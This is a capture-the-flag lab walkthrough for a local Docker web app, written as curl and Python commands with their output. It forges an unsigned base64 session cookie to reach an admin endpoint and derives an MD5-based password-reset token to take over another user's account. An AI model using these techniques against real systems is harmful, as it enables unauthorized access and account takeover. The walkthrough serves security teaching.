# Walkthrough

## Step 1: start the lab

```bash
docker compose up --build -d
```

## Step 2: flag 1 via unsigned cookie forgery

Confirm the cookie is base64 JSON by logging in and decoding it:

```bash
curl -sv http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' 2>&1 | grep set-cookie
```

```
< Set-Cookie: session=eyJ1c2VybmFtZSI6ICJhbGljZSIsICJyb2xlIjogInVzZXIifQ==; Path=/
```

```bash
echo "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJyb2xlIjogInVzZXIifQ==" | base64 -d
```

```
{"username": "alice", "role": "user"}
```

Forge an admin cookie:

```bash
FORGED=$(python3 -c "
import base64, json
data = json.dumps({'username': 'admin', 'role': 'admin'})
print(base64.b64encode(data.encode()).decode())
")
echo $FORGED
```

```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=
```

Send it:

```bash
curl -s http://127.0.0.1:5000/api/admin --cookie "session=$FORGED"
```

```json
{"flag1": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}", "message": "admin panel"}
```

## Step 3: flag 2 via predictable reset token

Confirm the token is predictable:

```bash
curl -s http://127.0.0.1:5000/api/reset \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob"}'
```

```json
{"message": "reset token issued", "token": "9f9d51bc70ef21ca5c14f307980a29d8"}
```

```bash
python3 -c "import hashlib; print(hashlib.md5(b'bob').hexdigest())"
```

```
9f9d51bc70ef21ca5c14f307980a29d8
```

Same value. Reset bob's password:

```bash
curl -s http://127.0.0.1:5000/api/reset/confirm \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","token":"9f9d51bc70ef21ca5c14f307980a29d8","password":"pwned"}'
```

```json
{"message": "password updated"}
```

Log in as bob:

```bash
SESSION=$(curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"pwned"}' \
  -D - | grep -i set-cookie | grep -oP 'session=\K[^;]+')

curl -s http://127.0.0.1:5000/api/profile --cookie "session=$SESSION"
```

```json
{"flag2": "POC{b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5}", "role": "user", "username": "bob"}
```

## Full attack chain

```
Inspect Set-Cookie on login response
    -> base64-decoded JSON, no signature

Encode {"username":"admin","role":"admin"} in base64
    -> GET /api/admin with forged cookie
    -> flag1                                      [unsigned cookie]

Compute MD5("bob") = 9f9d51bc70ef21ca5c14f307980a29d8
POST /api/reset {"username":"bob"}
    -> server returns same token
POST /api/reset/confirm {token, password:"pwned"}
    -> bob's password updated
Login as bob / GET /api/profile
    -> flag2                                      [predictable token]
```
